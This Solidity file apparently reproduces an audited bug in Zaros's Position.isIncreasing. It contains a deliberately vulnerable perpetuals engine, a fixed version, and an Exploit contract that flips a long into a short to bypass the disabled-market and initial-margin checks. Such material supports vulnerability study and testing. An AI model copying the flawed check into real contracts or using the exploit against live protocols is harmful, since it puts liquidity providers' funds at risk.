// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Zaros Position.isIncreasing (Cyfrin, 2024-07). The check only compares
    the sign of sizeDelta with the open size. A long of +1 flipped by
    sizeDelta -3 becomes a short of -2 and is treated as a decrease, so
    the disabled-market guard and the initial-margin check are both skipped.
    The vault posts 2000 USDC of LP funds against a short the trader's
    150 collateral cannot initially margin. The control treats a sign flip
    as an increase and reverts while the market is disabled.
*/

contract Token {
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Escrow {
    Token public token;

    constructor(Token _token) {
        token = _token;
    }
}

contract PerpEngine {
    struct Data {
        int256 size;
    }

    uint256 public constant PRICE = 1000 ether;
    Token public token;
    Escrow public escrow;
    mapping(uint128 => mapping(uint128 => Data)) public positions;
    mapping(address => uint256) public collateral;
    mapping(uint128 => bool) public marketEnabled;
    bool public settlementEnabled = true;
    bool public lastIncreasing;
    uint256 public lastRequired;

    constructor(Token _token, Escrow _escrow) {
        token = _token;
        escrow = _escrow;
    }

    function configure(uint128 marketId, bool enabled, bool settlement) external {
        marketEnabled[marketId] = enabled;
        settlementEnabled = settlement;
    }

    function open(address trader, uint128 account, uint128 marketId, int128 size, uint256 margin) external {
        positions[account][marketId].size = size;
        collateral[trader] = margin;
    }

    function isIncreasing(uint128 tradingAccountId, uint128 marketId, int128 sizeDelta) public view returns (bool) {
        Data storage self = positions[tradingAccountId][marketId];
        // @> VULN: isIncreasing ignores a flip through zero, so size + sizeDelta can grow risk in the opposite direction
        return self.size == 0 || (self.size > 0 && sizeDelta > 0) || (self.size < 0 && sizeDelta < 0);
    }

    function fillOrder(address trader, uint128 tradingAccountId, uint128 marketId, int128 sizeDelta) external {
        Data storage self = positions[tradingAccountId][marketId];
        bool increasing = isIncreasing(tradingAccountId, marketId, sizeDelta);
        lastIncreasing = increasing;
        if (increasing) {
            require(marketEnabled[marketId], "market disabled");
            require(settlementEnabled, "settlement disabled");
        }
        int256 newSize = self.size + sizeDelta;
        uint256 notional = _abs(newSize) * PRICE / 1e18;
        uint256 initialMargin = notional * 10 / 100;
        uint256 maintenanceMargin = notional * 5 / 100;
        bool useMaintenance = !increasing && self.size != 0;
        uint256 required = useMaintenance ? maintenanceMargin : initialMargin;
        lastRequired = required;
        require(collateral[trader] >= required, "margin");
        if (newSize < 0 && self.size >= 0) {
            uint256 posted = uint256(-newSize) * PRICE / 1e18;
            token.transfer(address(escrow), posted);
        }
        self.size = newSize;
    }

    function _abs(int256 v) internal pure returns (uint256) {
        return v < 0 ? uint256(-v) : uint256(v);
    }
}

contract PerpEngineFixed {
    struct Data {
        int256 size;
    }

    uint256 public constant PRICE = 1000 ether;
    Token public token;
    Escrow public escrow;
    mapping(uint128 => mapping(uint128 => Data)) public positions;
    mapping(address => uint256) public collateral;
    mapping(uint128 => bool) public marketEnabled;
    bool public settlementEnabled = true;

    constructor(Token _token, Escrow _escrow) {
        token = _token;
        escrow = _escrow;
    }

    function configure(uint128 marketId, bool enabled, bool settlement) external {
        marketEnabled[marketId] = enabled;
        settlementEnabled = settlement;
    }

    function open(address trader, uint128 account, uint128 marketId, int128 size, uint256 margin) external {
        positions[account][marketId].size = size;
        collateral[trader] = margin;
    }

    function isIncreasing(uint128 tradingAccountId, uint128 marketId, int128 sizeDelta) public view returns (bool) {
        Data storage self = positions[tradingAccountId][marketId];
        int256 next = self.size + sizeDelta;
        if (self.size == 0) return true;
        if (self.size > 0 && next < 0) return true;
        if (self.size < 0 && next > 0) return true;
        return (self.size > 0 && sizeDelta > 0) || (self.size < 0 && sizeDelta < 0);
    }

    function fillOrder(address trader, uint128 tradingAccountId, uint128 marketId, int128 sizeDelta) external {
        Data storage self = positions[tradingAccountId][marketId];
        bool increasing = isIncreasing(tradingAccountId, marketId, sizeDelta);
        if (increasing) {
            require(marketEnabled[marketId], "market disabled");
            require(settlementEnabled, "settlement disabled");
        }
        int256 newSize = self.size + sizeDelta;
        uint256 notional = (newSize < 0 ? uint256(-newSize) : uint256(newSize)) * PRICE / 1e18;
        uint256 required = increasing ? notional * 10 / 100 : notional * 5 / 100;
        require(collateral[trader] >= required, "margin");
        if (newSize < 0 && self.size >= 0) {
            token.transfer(address(escrow), uint256(-newSize) * PRICE / 1e18);
        }
        self.size = newSize;
    }
}

contract Exploit {
    uint128 public constant ACCOUNT = 1;
    uint128 public constant MARKET = 1;
    int128 public constant OPEN_SIZE = 1e18;
    int128 public constant SIZE_DELTA = -3e18;
    uint256 public constant COLLATERAL = 150 ether;
    uint256 public constant POSTED = 2000 ether;

    Token public token;
    Escrow public escrow;
    PerpEngine public engine;
    bool public increasing;
    int256 public sizeAfter;
    uint256 public required;

    constructor() {
        token = new Token();
        escrow = new Escrow(token);
        engine = new PerpEngine(token, escrow);
        engine.configure(MARKET, false, false);
        engine.open(address(this), ACCOUNT, MARKET, OPEN_SIZE, COLLATERAL);
    }

    function run() external {
        token.mint(address(engine), POSTED);
        increasing = engine.isIncreasing(ACCOUNT, MARKET, SIZE_DELTA);
        engine.fillOrder(address(this), ACCOUNT, MARKET, SIZE_DELTA);
        sizeAfter = engine.positions(ACCOUNT, MARKET);
        required = engine.lastRequired();
        require(!increasing, "flag");
        require(!engine.marketEnabled(MARKET), "market");
        require(!engine.settlementEnabled(), "settlement");
        require(sizeAfter == -2e18, "size");
        require(required == 100 ether, "maintenance");
        require(COLLATERAL < 200 ether, "initial");
        require(token.balanceOf(address(escrow)) == POSTED, "posted");
        require(token.balanceOf(address(engine)) == 0, "engine");
    }
}
